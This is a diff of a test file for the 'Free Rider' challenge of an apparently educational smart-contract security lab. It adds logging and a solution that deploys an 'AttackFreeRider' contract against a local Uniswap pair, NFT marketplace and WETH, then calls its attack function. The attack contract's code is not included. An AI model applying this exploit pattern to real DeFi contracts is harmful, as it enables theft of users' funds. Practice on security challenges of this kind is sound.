@@ -32,16 +32,20 @@ describe('[Challenge] Free Rider', function () {
         setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);
 
-        // Deploy WETH
+        console.log("Deploying WETH with deployer:", deployer.address);
         weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();
-
-        // Deploy token to be traded against WETH in Uniswap v2
+        console.log("WETH deployed at:", weth.address);
+        
+        console.log("Deploying Token...");
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-
-        // Deploy Uniswap Factory and Router
+        console.log("Token deployed at:", token.address);
+        
+        console.log("Deploying Uniswap Factory...");
         uniswapFactory = await (new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer)).deploy(
             ethers.constants.AddressZero // _feeToSetter
         );
+        console.log("Uniswap Factory deployed at:", uniswapFactory.address);
+        
         uniswapRouter = await (new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer)).deploy(
             uniswapFactory.address,
             weth.address
@@ -106,7 +110,36 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+      
+        console.log("Fetching AttackFreeRider contract factory...");
+        const FreeRider = await ethers.getContractFactory("AttackFreeRider", player);
+        
+        console.log("Deploying AttackFreeRider...");
+        const freeRider = await FreeRider.deploy(
+            uniswapPair.address,
+            marketplace.address,
+            devsContract.address,
+            weth.address,
+            nft.address,
+            { value: ethers.utils.parseEther("0.045") }
+        );
+        
+        console.log("AttackFreeRider deployed at:", freeRider.address);
+        console.log("Uniswap Pair Address:", uniswapPair.address);
+        console.log("Marketplace Address:", marketplace.address);
+        console.log("Devs Contract Address:", devsContract.address);
+        console.log("WETH Address:", weth.address);
+        console.log("NFT Address:", nft.address);
+        console.log("Attempting attack...");
+    
+        // You might want to log the result of attack to see if it's successful or returns any data.
+        await freeRider.attack(player.address).then(() => {
+            console.log("Attack executed successfully.");
+        }).catch((error) => {
+            console.error("Attack failed:", error);
+        });
     });
+    
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
